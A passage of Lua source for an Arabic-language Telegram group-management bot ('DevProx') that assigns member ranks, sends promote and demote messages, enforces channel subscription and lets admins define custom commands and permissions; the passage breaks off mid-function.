local id_rank = function(msg) if tonumber(msg.sender_user_id_) == tonumber(218385683) then ABS_PROX = 'مبرمج ٱڵسورس' elseif is_leader(msg) then ABS_PROX = 'ٱڵمطۄر ٱلٱسٱسي' elseif is_sudo3(msg.sender_user_id_) then ABS_PROX = 'ٱڵمطۄر ٱلثٱڵث' elseif is_ownerall(msg.sender_user_id_) then ABS_PROX = 'ٱڵمدير ٱڵعٱم' elseif is_adminall(msg.sender_user_id_) then ABS_PROX = 'ٱلٱدمن ٱڵعٱم' elseif is_vipall(msg.sender_user_id_) then ABS_PROX = 'ٱڵمميز ٱڵعٱم' elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = 'ٱڵمنشئ ٱلٱسٱسي' elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = 'ٱڵـۧمـۧنشئ' elseif is_owner(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = 'ٱڵـۧمـۧدير' elseif is_admin(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = 'ٱلٱدمـۧن' elseif is_donky(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = 'مطي مرتب 😹💔' elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = 'عضو مميز' else ABS_PROX = 'فقط عضو' end return ABS_PROX end
function rank_abs(user_id,chat_id) if tonumber(user_id) == tonumber(218385683) then ABS_PROX  = "ٱڵمبرمج" elseif is_leaderid(user_id) then ABS_PROX  = "ٱڵمطۄر" elseif is_sudoid(user_id) then ABS_PROX = "ٱڵمطۄر" elseif is_sudo3(user_id) then ABS_PROX = "ٱڵمطۄر" elseif is_ownerall(user_id) then ABS_PROX = "ٱڵمدير" elseif is_adminall(user_id) then ABS_PROX = "ٱلٱدمن" elseif is_monsh(user_id, chat_id) then ABS_PROX = "ٱڵمنشئ" elseif is_monshid(user_id, chat_id) then ABS_PROX = "ٱڵمنشئ" elseif is_owner(user_id, chat_id) then ABS_PROX = "ٱڵمدير" elseif is_admin(user_id, chat_id) then ABS_PROX = "ٱلٱدمـۧن" else ABS_PROX = "ٱڵعضو" end return ABS_PROX end
--     Source DevProx     --
--       Set Sudo3        --
function setSudo3(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم رفعه فيۧ قٱئمة ٱڵمطورين', 1, 'md')
end
end 
--     Source DevProx     --
--       Del Sudo3        --
function delSudo3(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـۧمـۧطـۧۄر ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تنزيڵه من قٱئمة ٱڵمطورين', 1, 'md')
end
end
--     Source DevProx     --
--       Set ownerall        --
function setownerall(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم رفعه فيۧ قٱئمة ٱڵمدرٱء ٱڵعٱمين', 1, 'md')
end
end
--     Source DevProx     --
--       Del ownerall        -- 
function delownerall(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵمدير ٱڵعٱم ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تنزيڵه من قٱئمة ٱڵمدرٱء ٱڵعٱمين', 1, 'md')
end
end
--     Source DevProx     --
--       Set adminall        -- 
function setadminall(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم رفعه فيۧ قٱئمة ٱلٱدمنية ٱڵعٱمين', 1, 'md')
end
end
--     Source DevProx     --
--       Del adminall        -- 
function deladminall(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱدمن ٱڵعٱم ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تنزيڵه من قٱئمة ٱلٱدمنية ٱڵعٱمين', 1, 'md')
end
end
--     Source DevProx     --
--       Set Vipall       -- 
function setvipall(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم رفعه فيۧ قٱئمة ٱڵمميزين ٱڵعٱم', 1, 'md')
end
end
--     Source DevProx     --
--       Del Vipall       -- 
function delvipall(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمميـۧز ٱڵعٱم ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تنزيڵه من قٱئمة ٱڵمميزين ٱڵعٱم', 1, 'md')
end
end
--     Source DevProx     --
--       Set Monsh        -- 
function setmonsh(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم رفعه منشئ ٱسٱسي', 1, 'md')
end
end
--     Source DevProx     --
--       Del Monsh        --
function delmonsh(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵمنشئ ٱلٱسٱسي ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تنزيڵه منشئ ٱسٱسي', 1, 'md')
end
end
--     Source DevProx     --
--       Set monshid       -- 
function setmonshid(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم رفعه فيۧ قٱئمة ٱڵمنشئين', 1, 'md')
end
end
--     Source DevProx     --
--       Del monshid       -- 
function delmonshid(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمنشئ ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تنزيڵه من قٱئمة ٱڵمنشئين', 1, 'md')
end
end
--     Source DevProx     --
--       Set Owner        -- 
function setowner(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم رفعه فيۧ قٱئمة ٱڵمدرٱء', 1, 'md')
end
end
--     Source DevProx     --
--       Del Owner        -- 
function delowner(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـۧمـۧديـۧر ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تنزيڵه من قٱئمة ٱڵمدرٱء', 1, 'md')
end
end
--     Source DevProx     --
--       Set admins        -- 
function setadmins(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم رفعه فيۧ قٱئمة ٱلٱدمنية', 1, 'md')
end
end
--     Source DevProx     --
--       Del admins        -- 
function deladmins(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱدمـن ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تنزيڵه من قٱئمة ٱلٱدمنية', 1, 'md')
end
end
--     Source DevProx     --
--       Set Vipmem       -- 
function setvipmem(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم رفعه فيۧ قٱئمة ٱڵمميزين', 1, 'md')
end
end
--     Source DevProx     --
--       Del Vipmem       -- 
function delvipmem(msg,chat,user)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمميز ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تنزيڵه من قٱئمة ٱڵمميزين', 1, 'md')
end
end
--     Source DevProx     --
function absmasco(user_id,chat_id)
if is_leaderid(user_id) then
var = true  
elseif DevAbs:sismember(DevProx..'abs:sudo3:', user_id) then
var = true  
elseif DevAbs:sismember(DevProx..'abs:ownerall:', user_id) then
var = true  
elseif DevAbs:sismember(DevProx..'abs:adminall:', user_id) then
var = true  
elseif DevAbs:sismember(DevProx..'abs:vipall:', user_id) then
var = true  
elseif DevAbs:sismember(DevProx..'abs:monsh:'..chat_id, user_id) then
var = true
elseif is_monsh(chat_id, user_id) then
var = true
elseif DevAbs:sismember(DevProx..'abs:monshid:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(DevProx..'abs:owners:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(DevProx..'abs:admins:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(DevProx..'abs:vipmem:'..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end
function masco(user_id,chat_id)
if is_leaderid(user_id) then
var = 'botow'  
elseif DevAbs:sismember(DevProx..'abs:sudo3:', user_id) then
var = 'sudo3'  
elseif DevAbs:sismember(DevProx..'abs:monsh:'..chat_id, user_id) then
var = 'monsh'
elseif DevAbs:sismember(DevProx..'abs:monshid:'..chat_id, user_id) then
var = 'monshid'
elseif DevAbs:sismember(DevProx..'abs:owners:'..chat_id, user_id) then
var = 'owner'  
else  
var = 'No'
end  
return var
end 
--     Source DevProx     --
local function check_filter_words(msg, value)
local abs = (DevProx..'bot:filters:'..msg.chat_id_)
if abs then
local names = DevAbs:hkeys(abs)
local text = ''
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not is_admin(msg.sender_user_id_, msg.chat_id_)then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
end
end
--     Source DevProx     --
local getChat = function(chat_id, cb)
tdcli_function({ID = "GetChat", chat_id_ = chat_id}, cb or dl_cb, nil)
end
--     Source DevProx     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageVoice",
voice_ = getInputFile(voice),
duration_ = duration or 0,
waveform_ = waveform,
caption_ = caption
}
sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageAudio",
audio_ = getInputFile(audio),
duration_ = duration or 0,
waveform_ = waveform,
caption_ = caption
}
sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = {
ID = "InputMessageSticker",
sticker_ = getInputFile(sticker),
width_ = 0,
height_ = 0
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
local function getChannelMembers(channel_id, offset, filter, limit,cb) 
tdcli_function ({ 
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {ID = "ChannelMembers" .. filter},
offset_ = offset,limit_ = limit}, 
cb, nil) 
end
function formsgg(msgs) 
local ABS_PROX = ''  
if msgs < 100 then 
ABS_PROX = 'جدٱ ضعيف' 
elseif msgs < 250 then 
ABS_PROX = 'ضعيف' 
elseif msgs < 500 then 
ABS_PROX = 'غير متفٱعڵ' 
elseif msgs < 750 then 
ABS_PROX = 'متوسط' 
elseif msgs < 1000 then 
ABS_PROX = 'متفٱعڵ' 
elseif msgs < 2000 then 
ABS_PROX = 'قمة ٱڵتفٱعڵ' 
elseif msgs < 3000 then 
ABS_PROX = 'مڵك ٱڵتفٱعڵ'  
elseif msgs < 4000 then 
ABS_PROX = 'ٱسطورة ٱڵتفٱعڵ' 
elseif msgs < 5000 then 
ABS_PROX = 'متفٱعڵ نٱر' 
elseif msgs < 5500 then 
ABS_PROX = 'يجدح جدح' 
elseif msgs < 6000 then 
ABS_PROX = 'خيٱڵي' 
elseif msgs < 7000 then 
ABS_PROX = 'رب ٱڵتفٱعل' 
elseif msgs < 8000 then 
ABS_PROX = 'كٱفر بٱڵتفٱعڵ' 
elseif msgs < 9000 then 
ABS_PROX = "معلك لربك" 
end 
return ABS_PROX
end
function title_name(GroupID) 
tdcli_function({ID ="GetChat",chat_id_=GroupID
},function(arg,data) 
DevAbs:set(DevProx..'bot:group:name'..GroupID,data.title_) 
end,nil) 
return DevAbs:get(DevProx..'bot:group:name'..GroupID)  end
--     Source DevProx     --
function absmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevAbs:get(DevProx..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source DevProx     --
function Abbas_Abs(msg)
local var = true 
if DevAbs:get(DevProx.."DevAbs2") then
local channel = ''..DevAbs:get(DevProx..'DevAbs3')..''
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getchatmember?chat_id='..channel..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevAbs:get(DevProx..'bot:textch:user') then
local textchuser = DevAbs:get(DevProx..'bot:textch:user')
Dev_Abs(msg.chat_id_, msg.id_, 1, '['..textchuser..']', 1, 'md')
else
Dev_Abs(msg.chat_id_,msg.id_, 1, "☬︙عذرٱ لٱيمكنك ٱستخدٱم ٱڵبوت \n☬︙رجائٱ ٱشترك في قنٱة ٱڵبوت \n☬︙ڵتتمكن من ٱستخدٱمه \n☬︙ٱڵقنٱة ↫ { ["..channel.."] } \n ", 1 , "md")
end
elseif data.ok then
return var
end
else
return var
end
end

function tdcli_update_callback(data)
local our_id = DevAbs:get(DevProx.."Our_ID") or 0
local api_id = DevAbs:get(DevProx.."Bot:Api_ID") or 0
if data.ID == "UpdateNewMessage" then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = data.message_.content_.text_
if text and DevAbs:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevAbs:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevAbs:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevAbs:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حـذف ٱلٱمـر مِن ٱڵمجـمۄعة", 1, 'html')  
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙لايوجد ٱمـر بِهـذٱ  ٱلٱســم", 1, 'html')
end
DevAbs:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if data.message_.content_.text_ then
local NewCmmd = DevAbs:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end

if text and DevAbs:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevAbs:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسِـل ٱلٱمـر ٱڵـجديـد", 1, 'html')
DevAbs:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevAbs:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevAbs:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevAbs:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevAbs:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـم حُـفِـظ ٱلٱمـر", 1, 'html')
DevAbs:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text == "الاوامر المضافه" and Abbas_Abs(msg) then
local list = DevAbs:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "☬︙قٱئمة ٱلٱوامر ٱڵمضافة ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
Cmds = DevAbs:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."⌯ ("..v..") • {"..Cmds.."}\n"
else
t = t..""..k.."⌯ ("..v..") \n"
end
end
if #list == 0 then
t = "☬︙لايوجد ٱوٱمـر مُـضافة فيۧ ٱڵمجـمۄعة"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "["..t.."]", 1, 'md')
end
if text == "حذف الاوامر المضافه" or text == "حذف الاوامر" or text == "مسح الاوامر المضافه" and Abbas_Abs(msg) then
local list = DevAbs:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
DevAbs:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevAbs:del(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حـذف ٱلٱوامـر ٱڵـمُـضافة فيۧ ٱڵـمجـمۄعة", 1, 'html')
end
if text == "اضف امر" or text == "اضافة امر" or text == "اضافه امر" and Abbas_Abs(msg) then
DevAbs:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسِـل ٱلٱمـر ٱڵـقديم", 1, 'html')
return false
end
if text == "حذف امر" or text == "مسح امر" and Abbas_Abs(msg) then 
DevAbs:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسِـل ٱلٱمـر ٱڵـذي قُـمتَ بٱضافتـة يدويـاً", 1, 'html')
return false
end
--     Source DevProx     --
if text == "الصلاحيات" or text == "صلاحيات" and Abbas_Abs(msg) then 
local list = DevAbs:smembers(bot_id.."Coomds"..msg.chat_id_)
if #list == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ايوجد صلاحيات مُـضافة فيۧ ٱڵمجـمۄعة", 1, 'html')
return false
end
t = "☬︙قٱئمة ٱڵصلٱحيٱت ٱڵمضافة ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
var = DevAbs:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..""..k.."⌯ "..v.." • ("..var..")\n"
else
t = t..""..k.."⌯ "..v.."\n"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الصلاحيات" or text == "مسح الصلاحيات" and Abbas_Abs(msg) then
local list = DevAbs:smembers(bot_id.."Coomds"..msg.chat_id_)
for k,v in pairs(list) do
DevAbs:del(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
DevAbs:del(bot_id.."Coomds"..msg.chat_id_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حذف ٱلصلاحيات ٱڵمُضافة فيۧ ٱڵمجمۄعة", 1, 'html')
end
if text and text:match("^اضف صلاحيه (.*)$") and Abbas_Abs(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevAbs:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevAbs:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
DevAbs:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسِـل نـوع ٱڵـصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n☬︙ٱرسـڵ ٱڵغٱء لٱڵغٱء ٱلٱمر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and Abbas_Abs(msg) or text and text:match("^مسح صلاحيه (.*)$") and Abbas_Abs(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevAbs:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـم حـذف ٱلصلاحيه", 1, 'html')
end
if DevAbs:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱڵـغـاء ٱلٱمـر", 1, 'html')
DevAbs:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تستطيع ٱضٱفة صلٱحية ( عضو • مميز  • ادمن )\n☬︙ٱرسٱڵ نوع ٱڵصلٱحيه مره ٱخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تستطيع ٱضٱفة صلٱحية ( عضو • مميز )\n☬︙ٱرسٱڵ نوع ٱڵصلٱحيه مره ٱخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تستطيع ٱضٱفة صلٱحية ( عضو )\n☬︙ٱرسٱڵ نوع ٱڵصلٱحيه مره ٱخرى", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevAbs:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevAbs:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـم ٱضافة ٱلصلاحيه", 1, 'html')
DevAbs:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Abbas_Abs(msg) then 
local DEV_ABBAS = text:match("رفع (.*)")
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = DevAbs:get(bot_id.."Comd:New:rt:bot:"..DEV_ABBAS..msg.chat_id_)
if mrabs == "مميز" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم رفعه ❨ '..DEV_ABBAS..' ❩ بنجٱح', 1, 'md')
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
DevAbs:sadd(DevProx..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم رفعه ❨ '..DEV_ABBAS..' ❩ بنجٱح', 1, 'md')
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
DevAbs:sadd(DevProx..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "مدير" and is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم رفعه ❨ '..DEV_ABBAS..' ❩ بنجٱح', 1, 'md')
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
DevAbs:sadd(DevProx..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "عضو" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم رفعه ❨ '..DEV_ABBAS..' ❩ بنجٱح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Abbas_Abs(msg) then 

local DEV_ABBAS = text:match("تنزيل (.*)")
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = DevAbs:get(bot_id.."Comd:New:rt:bot:"..DEV_ABBAS..msg.chat_id_)
if mrabs == "مميز" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم تنزيلة ❨ '..DEV_ABBAS..' ❩ بنجٱح', 1, 'md')
DevAbs:srem(DevProx..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم تنزيلة ❨ '..DEV_ABBAS..' ❩ بنجٱح', 1, 'md')
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "مدير" and is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n☬︙تـۖم تنزيلة ❨ '..DEV_ABBAS..' ❩ بنجٱح', 1, 'md')
DevAbs:srem(DevProx..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "عضو" and is_admin(msg.sender_user_id_, msg.chat_id_) then
